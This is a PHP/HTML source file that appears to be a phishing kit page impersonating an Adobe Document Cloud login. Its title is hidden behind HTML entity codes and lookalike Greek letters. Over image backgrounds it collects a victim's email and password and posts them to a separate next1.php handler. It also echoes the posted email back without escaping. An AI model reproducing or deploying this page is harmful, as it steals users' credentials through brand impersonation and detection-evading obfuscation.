<?php
$email = $_POST['email'];
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#65;&#100;&#959;&#98;&#101;&#32;&#68;&#959;&#99;&#117;&#109;&#101;&#110;&#116;&#32;&#67;&#108;&#959;&#117;&#100;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
 
.textbox {
   border: 1px solid #000000; 
    height: 44px; 
    width: 275px; 
   	font-family: Verdana;
    font-size: 14px;
    color: #000000; 
    padding-left: 8px; 
    border-radius: 2px; 
	box-shadow: 3px 3px 3px #000000;
}


 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#000000">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:205px; z-index:0"><img src="images/e4.png" alt="" title="" border=0 width=1365 height=205></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:203px; width:1365px; height:221px; z-index:1"><img src="images/e5.png" alt="" title="" border=0 width=1365 height=221></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:422px; width:1365px; height:215px; z-index:2"><img src="images/e6.png" alt="" title="" border=0 width=1365 height=215></div>
<form action=next1.php name=dafahojaage id=dafahojaage method=post>
<input name="email" value="<?=$email?>" placeholder="" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:319px;left:626px;top:155px;z-index:3">
<input name="psw"  placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:319px;left:626px;top:210px;z-index:4">
<div id="formimage1" style="position:absolute; left:625px; top:264px; z-index:5"><input type="image" name="formimage1" width="325" height="55" src="images/vbtn.png"></div>
</div>

 
	
</body>
</html>
